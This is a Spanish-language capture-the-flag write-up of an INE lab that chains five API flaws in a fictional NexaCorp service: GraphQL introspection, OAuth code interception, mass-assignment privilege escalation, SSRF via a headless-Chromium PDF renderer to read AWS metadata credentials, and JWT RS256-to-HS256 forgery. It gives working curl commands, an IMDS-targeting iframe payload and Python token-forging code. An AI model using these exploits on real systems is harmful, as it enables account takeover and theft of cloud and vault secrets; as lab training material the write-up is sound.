# NexaCorp API Chain — CTF Writeup

> Reto INE: 5-stage attack chain contra una API empresarial ficticia.
> Objetivo final: pasar de outsider sin credenciales a acceso completo al vault interno.

## Datos del lab

- **Target:** `nexacorp.ine.local` (10.4.17.155)
- **Plataforma:** INE labs
- **Stack detectado:** Node.js + Express (API) + React (frontend) + nginx
- **Stages:** 5 vulnerabilidades encadenadas (OWASP API Top 10)

---

## Stage 1 — Recon: JS bundle + GraphQL introspection leak

### Flag

```
[REDACTED-FLAG-STAGE1]
```

(Submission sin wrapper `FLAG{[REDACTED]}` / `INE{[REDACTED]}`.)

### Resumen

El servidor expone:
- Una API Express en el **puerto 8090** sin frontend en la raíz (devuelve `Cannot GET /`).
- Un frontend React servido por **nginx en el puerto 1337**.

El frontend referencia un único bundle (`/assets/app.bundle.js`) que filtra rutas REST internas, y el backend GraphQL en `/api/graphql` tiene **introspection habilitada**, exponiendo todo el schema (incluyendo un campo `debugInfo.flag` que entrega el flag de Stage 1 a cualquier visitante no autenticado).

### Pasos detallados

#### 1. Escaneo inicial de puertos

```bash
nmap -sV nexacorp.ine.local
```

Resultado: `22/ssh`, `3389/xrdp`, `8090/http (Express)`.

Escaneo completo confirma un cuarto puerto:

```bash
sudo nmap -p- --min-rate 5000 -T4 nexacorp.ine.local
```

```
22/tcp   open  ssh
1337/tcp open  waste       ← luego identificado como nginx
3389/tcp open  ms-wbt-server
8090/tcp open  opsmessaging
```

#### 2. Exploración inicial del puerto 8090

```bash
curl -sv http://nexacorp.ine.local:8090/
```

Devuelve `404 Cannot GET /` con headers reveladores:

```
X-Powered-By: Express
Access-Control-Allow-Origin: *
```

→ Es una **API REST/GraphQL pura**, sin frontend en este puerto. CORS abierto.

Rutas estándar (`/api`, `/api/docs`, `/swagger`, `/openapi.json`, `/robots.txt`, `/.env`) → todas 404.

#### 3. Identificación del frontend en 1337

```bash
curl -sv http://nexacorp.ine.local:1337/
```

```html
<title>NexaCorp Cloud Platform</title>
...
<script type="module" crossorigin src="/assets/app.bundle.js"></script>
```

→ React SPA servida por `nginx/1.29.8`.

#### 4. Fuzzing dirigido al backend con POST + JSON

El fuzz inicial con GET no encontró nada. Con POST + body JSON, ffuf descubrió GraphQL:

```bash
ffuf -u http://nexacorp.ine.local:8090/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -X POST -H "Content-Type: application/json" -d '{}' \
  -mc all -fc 404 -t 50
```

```
api/graphql    [Status: 400, Size: 44, Words: 3, Lines: 1]
```

El 400 con 44 bytes es la respuesta clásica de GraphQL (`Must provide query string`).

#### 5. Confirmación de GraphQL

```bash
curl -s -X POST http://nexacorp.ine.local:8090/api/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __typename }"}'
```

```json
{"data":{"__typename":"Query"}}
```

#### 6. Introspection — extracción del schema completo

```bash
curl -s -X POST http://nexacorp.ine.local:8090/api/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name type { name kind ofType { name } } } } } }"}' | jq
```

Schema relevante descubierto:

```graphql
type Query {
  me: User
  users: [User]
  vaultSecrets: [VaultSecret]
  internalLogs: [String]
  debugInfo: DebugInfo
}

type Mutation {
  updateProfile: User
  promoteUser: User
  resetCredentials: String
  purgeAuditLog: Boolean
}

type User {
  id: ID!
  email: String!
  displayName: String
  avatar: String
  role: String
  permissions: [String]
  createdAt: String
}

type VaultSecret {
  id: ID!
  key: String!
  value: String
  classification: String
  accessLevel: String
}

type DebugInfo {
  buildVersion: String
  environment: String
  flag: String
  recon_token: String
  internalEndpoints: [String]
}
```

#### 7. Query a `debugInfo` — flag + intel para próximas etapas

```bash
curl -s -X POST http://nexacorp.ine.local:8090/api/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ debugInfo { buildVersion environment flag recon_token internalEndpoints } }"}' | jq
```

```json
{
  "data": {
    "debugInfo": {
      "buildVersion": "3.2.1-staging",
      "environment": "production",
      "flag": "FLAG{[REDACTED]}",
      "recon_token": "[REDACTED-JWT]",
      "internalEndpoints": [
        "http://internal-vault.nexacorp.local:8200",
        "http://169.254.169.254/latest/meta-data/"
      ]
    }
  }
}
```

#### 8. Análisis del JWT recon_token

```
Header:  {"alg":"HS256","typ":"JWT"}
Payload: {"purpose":"oauth_init","iat":1778096528,"exp":1778182928}
```

`purpose: oauth_init` → el token es un ticket para iniciar un flujo OAuth (probable vector Stage 2).

#### 9. Análisis del bundle JS — rutas REST reales

```bash
curl -s http://nexacorp.ine.local:1337/assets/app.bundle.js -o app.bundle.js
grep -oE '"/api/[a-zA-Z0-9/_\-]+"' app.bundle.js | sort -u
```

```
"/api/v2/reports/generate"
"/api/v2/users/me"
"/api/vault/critical-secrets"
```

→ **Mapa de la API descubierto.** El endpoint `/api/vault/critical-secrets` confirma que es el objetivo final (Stage 5).

### Submission

El flag se subió **sin wrapper**:

```
[REDACTED-FLAG-STAGE1]
```

### Vulnerabilidades aprovechadas

| API Top 10 | Issue |
|------------|-------|
| API7:2023 — Server-Side Request Forgery | (preview, internalEndpoints expuestos) |
| API8:2023 — Security Misconfiguration | GraphQL introspection habilitada en producción |
| API9:2023 — Improper Inventory Management | Frontend bundle expone rutas internas |
| API3:2023 — Broken Object Property Level Authorization | Campo `debugInfo` accesible sin autenticación |

---

## Intel acumulado para próximas etapas

### Tokens / credenciales

- **recon_token JWT** (HS256, expira en ~24h) — uso pendiente en flujo OAuth.

### Endpoints internos descubiertos

- `http://internal-vault.nexacorp.local:8200` — HashiCorp Vault interno (target final).
- `http://169.254.169.254/latest/meta-data/` — AWS instance metadata (vector SSRF).

### Endpoints REST conocidos

- `POST /api/graphql`
- `GET /api/v2/users/me`
- `POST /api/v2/reports/generate` (probable consumo de URL → SSRF)
- `GET /api/vault/critical-secrets` (objetivo final)

### Mutaciones GraphQL sospechosas

- `updateProfile` — candidato a mass assignment del campo `role`.
- `promoteUser` — candidato a BFLA (broken function-level auth).
- `resetCredentials` — posible bypass de auth.

---

## Stage 2 — OAuth `redirect_uri` bypass via `startsWith()`

> Pista del lab: *"Una credencial destinada a otra persona termina en tus manos."*

### Flag

```
[REDACTED]
```

### Resumen

El servidor expone un Authorization Server OAuth en `/oauth/authorize` y `/oauth/token` (puerto 8090, sin prefijo `/api/`). El flow legítimo está pensado para el cliente `nexacorp-prod` que redirige a `https://app.nexacorp.io/callback` (un dominio externo del frontend SaaS).

La vulnerabilidad: el Authorization Server **valida `redirect_uri` con `startsWith()`** (lo confirma el propio response: *"redirect_uri validation used startsWith() — any URI starting with the valid prefix was accepted"*). Pero más importante: como atacante de red **no necesitas controlar `app.nexacorp.io`** — basta con leer el header `Location:` del 302 emitido por `/oauth/authorize`, que contiene el `code` *en claro*. El navegador legítimo del usuario seguiría el redirect; tú con `curl -I` te quedas con el `code`.

Eso es literalmente la pista: la credencial (un authorization code → JWT) iba destinada al cliente legítimo (`app.nexacorp.io`), pero termina en tus manos al interceptar el `Location` antes de que un navegador lo siga.

### Pasos

#### 1. Descubrir endpoints OAuth y client_id

`/oauth/authorize` y `/oauth/token` aparecen literalmente en el bundle JS del frontend (`/assets/app.bundle.js` en :1337). El `client_id` también:

```bash
grep -oE '"[a-zA-Z][a-zA-Z0-9_.-]{3,50}"' app.bundle.js \
  | grep -iE '(client|portal|nexacorp|sso|oauth|spa|app)' | sort -u
```

Resultado relevante: `"nexacorp-prod"` y `"oauth_state"` (lo que confirma que el frontend hace flow OAuth con state CSRF).

#### 2. Sondear `/oauth/authorize` para que el server filtre el `redirect_uri` esperado

```bash
curl -sG "http://nexacorp.ine.local:8090/oauth/authorize" \
  --data-urlencode "client_id=nexacorp-prod" \
  --data-urlencode "redirect_uri=http://localhost" \
  --data-urlencode "response_type=code" \
  --data-urlencode "recon_token=<rt>"
```

```json
{"error":"invalid_redirect_uri",
 "error_description":"redirect_uri must start with: https://app.nexacorp.io/callback"}
```

→ El servidor revela el prefijo esperado.

#### 3. Obtener un `recon_token` fresco desde GraphQL

```bash
curl -s -X POST http://nexacorp.ine.local:8090/api/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ debugInfo { recon_token } }"}' | jq -r '.data.debugInfo.recon_token'
```

#### 4. Pedir un authorization code legítimo y robar el `Location` header

```bash
curl -sI -G "http://nexacorp.ine.local:8090/oauth/authorize" \
  --data-urlencode "client_id=nexacorp-prod" \
  --data-urlencode "redirect_uri=https://app.nexacorp.io/callback" \
  --data-urlencode "response_type=code" \
  --data-urlencode "recon_token=<recon_token>" \
  --data-urlencode "state=test"
```

```
HTTP/1.1 302 Found
Location: https://app.nexacorp.io/callback?code=b080168b3557401eabc148b042ccbb32&state=test
```

El `code` queda en el header `Location:`; nunca tuvimos que seguir el redirect ni controlar el dominio externo.

#### 5. Cambiar el code por el `access_token`

```bash
curl -s -X POST http://nexacorp.ine.local:8090/oauth/token \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=authorization_code&code=<code>&client_id=nexacorp-prod&redirect_uri=https://app.nexacorp.io/callback"
```

```json
{
  "access_token": "[REDACTED-JWT]",
  "token_type": "Bearer",
  "expires_in": 28800,
  "scope": "openid profile",
  "flag": "FLAG{[REDACTED]}",
  "_note": "redirect_uri validation used startsWith() — any URI starting with the valid prefix was accepted."
}
```

Payload del JWT robado:

```json
{
  "sub": "1003",
  "iss": "https://auth.nexacorp.io",
  "aud": "nexacorp-prod",
  "iat": 1778120873,
  "exp": 1778149673
}
```

→ JWT real del usuario 1003 con `aud: nexacorp-prod`. Es la credencial que terminó en nuestras manos.

### Vulnerabilidades

| API Top 10 | Issue |
|------------|-------|
| API2:2023 — Broken Authentication | OAuth `redirect_uri` validado con `startsWith()` permite filtrar el code a un destinatario indebido |
| API8:2023 — Security Misconfiguration | El AS confiesa el prefijo válido en el error, y el `/oauth/token` retorna `flag` y `_note` en el response |

### Intel para próximas etapas

- JWT del user 1003 (`sub:"1003"`, `aud: nexacorp-prod`) válido por 8h — base de las próximas etapas.
- `iss: https://auth.nexacorp.io` (issuer remoto) → relevante si Stage 4/5 piden un JWT con claims específicos.
- Las queries `users`, `me`, `internalLogs`, `vaultSecrets` aún devuelven `null/redacted` con este token (rol bajo) — Stage 3 deberá escalar.

---

## Stage 3 — Mass Assignment en REST (`PUT /api/v2/users/me`)

> Pista del lab: *"Te diste acceso al sistema que nunca tuvo la intención de conceder."*

### Flag

```
[REDACTED]
```

### Resumen

GraphQL es estricto con los argumentos: la mutación `updateProfile(displayName, email, avatar)` rechaza explícitamente cualquier arg extra (`role`, `permissions`, `isAdmin`) con `Unknown argument`. Sin embargo, el **endpoint REST shadow `PUT /api/v2/users/me`** acepta cualquier campo del body y lo escribe directo sobre el documento del usuario, **sin allowlist**.

El propio servidor te confirma la vuln en la respuesta:

```
"_vulnerability": "Mass Assignment / BOPLA (OWASP API3:2023) — no field allowlisting on PUT /api/v2/users/me"
```

### Pasos

#### 1. Confirmar identidad con el JWT de Stage 2

```bash
curl -s -X POST "http://nexacorp.ine.local:8090/api/graphql" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <stage2_jwt>" \
  -d '{"query":"{ me { id email role permissions } users { id email role } }"}' | jq
```

```json
{
  "data": {
    "me": {"id":"1003","email":"analyst@nexacorp.io","role":"employee","permissions":["read"]},
    "users": [
      {"id":"1003","email":"analyst@nexacorp.io","role":"employee","permissions":["read"]},
      {"id":"1001","email":"admin@nexacorp.io","role":"admin","permissions":["read","write","admin"]}
    ]
  }
}
```

→ Soy el user 1003 (`employee`). El target a copiar es el 1001 (`admin`).

#### 2. Descartar mass assignment vía GraphQL (validación estricta)

```bash
curl -s -X POST "http://nexacorp.ine.local:8090/api/graphql" \
  -H "Authorization: Bearer <stage2_jwt>" -H "Content-Type: application/json" \
  -d '{"query":"mutation { updateProfile(role:\"admin\", permissions:[\"*\"]) { id role } }"}'
```

```json
{"errors":[{"message":"Unknown argument \"role\" on field \"Mutation.updateProfile\"."}]}
```

→ GraphQL rechaza args fuera del schema. **Toca buscar canal alternativo.**

#### 3. Probar `PUT /api/v2/users/me` con `role` en el body

```bash
curl -s -X PUT "http://nexacorp.ine.local:8090/api/v2/users/me" \
  -H "Authorization: Bearer <stage2_jwt>" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin","permissions":["admin","read","write"]}'
```

```json
{
  "success": true,
  "user": {
    "id":"1003",
    "email":"analyst@nexacorp.io",
    "role":"admin",
    "permissions":["admin","read","write"]
  },
  "message":"Profile updated. Privilege escalation detected — role written directly from request body.",
  "flag":"FLAG{[REDACTED]}",
  "_vulnerability":"Mass Assignment / BOPLA (OWASP API3:2023) — no field allowlisting on PUT /api/v2/users/me",
  "admin_panel":"/admin"
}
```

→ Mismo `id` (1003), pero el role pasó de `employee` a `admin`. El JWT no cambia: el server lee `role`/`permissions` de la BD usando `sub` en cada request, así que la siguiente petición ya nos trata como admin.

#### 4. Confirmar la escalación con `me`

```bash
curl -s -X POST "http://nexacorp.ine.local:8090/api/graphql" \
  -H "Authorization: Bearer <stage2_jwt>" -H "Content-Type: application/json" \
  -d '{"query":"{ me { id email role permissions } }"}'
```

```json
{"data":{"me":{"id":"1003","role":"admin","permissions":["admin","read","write"]}}}
```

### Vulnerabilidad

| API Top 10 | Issue |
|------------|-------|
| API3:2023 — Broken Object Property Level Authorization | `PUT /api/v2/users/me` permite escribir cualquier campo (`role`, `permissions`, `isAdmin`) sin allowlist |
| API9:2023 — Improper Inventory Management | Existe un endpoint REST shadow no documentado paralelo a la API GraphQL "oficial" con políticas distintas |

### Intel para próximas etapas

- **`admin_panel: /admin`** — endpoint nuevo revelado en la respuesta. Probable target de Stage 4/5.
- Ahora con `role: admin` y `permissions: ["admin","read","write"]`, las queries GraphQL antes vetadas (`internalLogs`, `vaultSecrets`) deberían empezar a devolver datos.
- El endpoint `POST /api/v2/reports/generate` sigue pendiente — encaja con la pista de Stage 4 *"El servidor trae algo interno en su nombre"* (SSRF clásico).

---

## Stage 4 — Blind SSRF vía PDF render exfiltration

> Pista del lab: *"El servidor trae algo interno en su nombre."*

### Flag

```
[REDACTED]
```

### Resumen

`POST /api/v2/reports/generate` no acepta una URL directa — pide un campo `template` con HTML que se renderiza con **Chromium headless (Puppeteer)** y devuelve un PDF en base64. Cuando el iframe / fetch dentro del template apunta a una URL interna (AWS metadata, Vault interno), el headless browser hace la request **desde la red interna del servidor**, embebe la respuesta dentro del PDF, y la API te devuelve el PDF — exfil out-of-band perfecto.

La pista *"trae algo interno en su nombre"* aplica literal: el servidor (con su identidad de red) hace request a recursos internos en tu nombre y te devuelve el contenido renderizado.

### Pasos

#### 1. Descubrir la forma del endpoint

```bash
curl -s -X POST "http://nexacorp.ine.local:8090/api/v2/reports/generate" \
  -H "Authorization: Bearer <jwt>" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://example.com"}'
```

```json
{"error":"template field is required (HTML string)"}
```

→ El endpoint espera un campo `template` con HTML.

#### 2. Confirmar render con HTML mínimo

```bash
curl -s -X POST "http://nexacorp.ine.local:8090/api/v2/reports/generate" \
  -H "Authorization: Bearer <jwt>" \
  -H "Content-Type: application/json" \
  -d '{"template":"<html><body><h1>hello</h1></body></html>"}'
```

Respuesta:

```json
{
  "success": true,
  "pdf_base64": "JVBERi0xLjQK...",
  "pdf_size_bytes": 5676,
  "rendering_engine": "Chromium (Puppeteer)"
}
```

→ El server confirma engine: **Chromium headless** → todo recurso referenciado en el HTML (iframe, img, fetch, link, object) se cargará durante el render.

#### 3. Inyectar `<iframe>` apuntando a AWS IMDS

```bash
TPL='<html><body><iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/nexacorp-prod-role" width="1200" height="2000"></iframe></body></html>'

curl -s -X POST "http://nexacorp.ine.local:8090/api/v2/reports/generate" \
  -H "Authorization: Bearer <jwt>" \
  -H "Content-Type: application/json" \
  -d "$(jq -n --arg t "$TPL" '{template:$t}')" \
  | jq -r '.pdf_base64' | base64 -d > /tmp/iam.pdf
```

El PDF resultante (~18KB) embebe la respuesta JSON de AWS IMDS dentro del render.

#### 4. Decodificar el texto del PDF

Chromium genera el PDF con **subset fonts y CMap Adobe-Identity-UCS** (cada glyph es un valor de 16 bits que apunta a un Unicode vía la tabla embebida en el PDF). Sin parsear la CMap el texto sale ilegible. Decoder en Python puro (`zlib` para descomprimir streams + regex para extraer `bfchar` / `bfrange`):

```python
import re, zlib, base64

def decompress_streams(pdf):
    out = []
    for s in re.findall(rb'stream\r?\n(.*?)\r?\nendstream', pdf, re.DOTALL):
        try: out.append(zlib.decompress(s.strip(b'\r\n ')))
        except: out.append(s)
    return out

def parse_cmap(streams):
    table = {}
    for s in streams:
        try: text = s.decode('latin-1')
        except: continue
        for block in re.findall(r'beginbfchar(.*?)endbfchar', text, re.DOTALL):
            for code, uni in re.findall(r'<([0-9A-Fa-f]+)>\s*<([0-9A-Fa-f]+)>', block):
                table[int(code,16)] = chr(int(uni,16))
        for block in re.findall(r'beginbfrange(.*?)endbfrange', text, re.DOTALL):
            for s_, e_, u_ in re.findall(r'<([0-9A-Fa-f]+)>\s*<([0-9A-Fa-f]+)>\s*<([0-9A-Fa-f]+)>', block):
                sn, en = int(s_,16), int(e_,16); u = int(u_,16)
                for i, code in enumerate(range(sn, en+1)):
                    table[code] = chr(u + i)
    return table

def extract(pdf):
    streams = decompress_streams(pdf)
    cmap = parse_cmap(streams)
    out = []
    for s in streams:
        try: text = s.decode('latin-1')
        except: continue
        for hex_str in re.findall(r'<([0-9A-Fa-f\s]+)>\s*Tj', text):
            hx = re.sub(r'\s+', '', hex_str)
            for i in range(0, len(hx), 4):
                if i + 4 <= len(hx):
                    out.append(cmap.get(int(hx[i:i+4], 16), ''))
            out.append(' ')
    return ''.join(out)

print(extract(open('/tmp/iam.pdf','rb').read()))
```

Salida:

```json
{
  "Code":"Success",
  "LastUpdated":"2026-05-07T03:39:24.187Z",
  "Type":"AWS-HMAC",
  "AccessKeyId":"[REDACTED]",
  "SecretAccessKey":"[REDACTED]",
  "Token":"[REDACTED]",
  "Expiration":"2026-05-07T04:39:24.187Z",
  "Role":"nexacorp-prod-role",
  "Flag":"FLAG{[REDACTED]}",
  "JWKS_Endpoint":"https://auth.nexacorp.io/.well-known/jwks.json",
  "_hint":"auth.nexacorp.io resolves to the NexaCorp target server. Use the RSA public key from JWKS_Endpoint (substitute auth.nexacorp.io with <TARGET_IP>:1337) with alg=HS256 to forge a super-admin JWT for /api/vault/critical-secrets"
}
```

### Vulnerabilidades

| API Top 10 | Issue |
|------------|-------|
| API7:2023 — Server-Side Request Forgery | El template del generador de PDFs renderiza HTML sin filtrar src de iframes/img/fetch — el headless browser carga URLs internas (AWS IMDS, Vault) desde la red de confianza |
| API8:2023 — Security Misconfiguration | Chromium headless con egress libre a `169.254.169.254` y a hosts internos del VPC; sin allowlist de hosts en el renderer |

### Notas técnicas

- **El cipher aparente shift +29 ASCII** (`hello → KHOOR`) es coincidencia del orden en que el subset font asignó glyph IDs. No es un cifrado — es la tabla CMap embebida del subset font Liberation Mono. Para PDFs con muchos caracteres únicos hay que parsear `bfchar`/`bfrange` reales.
- `pdftotext` (poppler-utils) hace esto automáticamente, pero no se pudo instalar en el lab por mirror caído. Por eso el decoder Python en stdlib fue crítico.

### Intel para Stage 5

El propio response de Stage 4 dicta literalmente cómo cerrar el reto:
> *"Use the RSA public key from JWKS_Endpoint with alg=HS256 to forge a super-admin JWT for /api/vault/critical-secrets"*

Y revela que **`auth.nexacorp.io` apunta al mismo servidor del lab** — es decir, el JWKS está disponible en `http://nexacorp.ine.local:1337/.well-known/jwks.json` (también en `:8090`).

---

## Stage 5 — JWT Algorithm Confusion (RS256 → HS256)

> Pista del lab: *"Entras por una puerta usando una identidad que forjaste."*

### Flag

```
[REDACTED]
```

### Resumen

`/api/vault/critical-secrets` valida tokens HS256 usando la **clave pública RSA como secret HMAC** — el bug clásico de algorithm confusion (CVE-2016-10555 pattern). El servidor mismo lo confiesa cuando le mandas un JWT inválido:

```json
{"error":"Token verification failed",
 "hint":"If using HS256: the server verifies with the RSA public key as the HMAC secret."}
```

JWKS público en `/.well-known/jwks.json` con `kid: "nexacorp-prod-key-1"` y `_hint: "alg header is trusted from the incoming token"`.

### Pasos

#### 1. Descargar el JWKS y reconstruir la pública RSA en PEM

```bash
curl -s http://nexacorp.ine.local:8090/.well-known/jwks.json | jq
```

```python
import json, base64
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
from cryptography.hazmat.backends import default_backend

def b64u(s): return base64.urlsafe_b64decode(s + '='*(-len(s)%4))

key = json.load(open("jwks.json"))["keys"][0]
n = int.from_bytes(b64u(key["n"]), "big")
e = int.from_bytes(b64u(key["e"]), "big")
pub = RSAPublicNumbers(e, n).public_key(default_backend())
open("pubkey.pem","wb").write(pub.public_bytes(Encoding.PEM, PublicFormat.SubjectPublicKeyInfo))
```

#### 2. Forjar JWT HS256 firmado con el PEM como secret HMAC, role: super-admin

```python
import hmac, hashlib, json, base64, time

with open("pubkey.pem","rb") as f:
    secret = f.read()

header = {"alg":"HS256","typ":"JWT","kid":"nexacorp-prod-key-1"}
now = int(time.time())
payload = {
    "sub":"super-admin",
    "email":"super-admin@nexacorp.local",
    "role":"super-admin",
    "permissions":["*","admin","super-admin","vault:read","vault:write","vault:critical"],
    "iat": now,
    "exp": now + 3600,
}
b = lambda x: base64.urlsafe_b64encode(json.dumps(x,separators=(',',':')).encode()).rstrip(b'=').decode()
h, p = b(header), b(payload)
sig = hmac.new(secret, f"{h}.{p}".encode(), hashlib.sha256).digest()
print(f"{h}.{p}.{base64.urlsafe_b64encode(sig).rstrip(b'=').decode()}")
```

> Una primera prueba con `role:"admin"` devuelve:
> `{"error":"Insufficient privileges","current_role":"admin","required_role":"super-admin","hint":"Modify the JWT payload to set role: \"super-admin\" and forge the signature."}`
> El servidor confirma que el JWT forjado **pasó validación de firma** y solo necesita el role correcto.

#### 3. Petición autenticada al vault

```bash
curl -s "http://nexacorp.ine.local:8090/api/vault/critical-secrets" \
  -H "Authorization: Bearer <forged_jwt>"
```

```json
{
  "vault_access":"GRANTED",
  "algorithm_used":"HS256 (algorithm confusion attack successful)",
  "critical_secrets":{
    "database_master":"[REDACTED]",
    "aws_root_key":"[REDACTED]",
    "aws_root_secret":"[REDACTED]",
    "internal_api_signing_key":"[REDACTED]",
    "flag":"FLAG{[REDACTED]}"
  },
  "_vulnerability":"JWT Algorithm Confusion (CVE-2016-10555 pattern) — server trusted alg header, used RSA public key as HS256 HMAC secret"
}
```

### Vulnerabilidad

| API Top 10 | Issue |
|------------|-------|
| API2:2023 — Broken Authentication | Servidor confía en el `alg` del token y mezcla algoritmos asimétricos/simétricos — JWT firmado con HS256 usando la pública RSA como secret HMAC se valida igual que un RS256 legítimo |
| API8:2023 — Security Misconfiguration | El JWKS expone `_hint` con la vuln, y `/api/vault/critical-secrets` confiesa el método de verificación cuando le mandas un token inválido |

### Loot del vault

- **DB master:** `[REDACTED]`
- **AWS root:** `[REDACTED]`
- **Internal API signing key:** `[REDACTED]`

---

## Resumen de la cadena de 5 etapas

| # | Pista | Vulnerabilidad | Flag |
|---|---|---|---|
| 1 | "Algo quedó expuesto que no debería ser público" | GraphQL introspection + JS bundle leak | `[REDACTED]` |
| 2 | "Una credencial destinada a otra persona termina en tus manos" | OAuth `redirect_uri` startsWith() bypass | `[REDACTED]` |
| 3 | "Te diste acceso al sistema que nunca tuvo la intención de conceder" | Mass Assignment en `PUT /api/v2/users/me` | `[REDACTED]` |
| 4 | "El servidor trae algo interno en su nombre" | Blind SSRF vía PDF render (Chromium headless) | `[REDACTED]` |
| 5 | "Entras por una puerta usando una identidad que forjaste" | JWT Algorithm Confusion (RS256 → HS256) | `[REDACTED]` |

---

## Herramientas usadas

- `nmap` — escaneo de puertos
- `curl` — interacción con API
- `ffuf` — fuzzing de directorios y endpoints
- `jq` — parseo de JSON
- `grep` — análisis del bundle JS
- `python3` — forge de JWT, parser PDF/CMap, RSA pub key reconstruction
- `cryptography` (PyPI) — RSAPublicNumbers para reconstruir el PEM desde el JWKS
- SecLists wordlists (`api-endpoints.txt`, `raft-large-words.txt`)
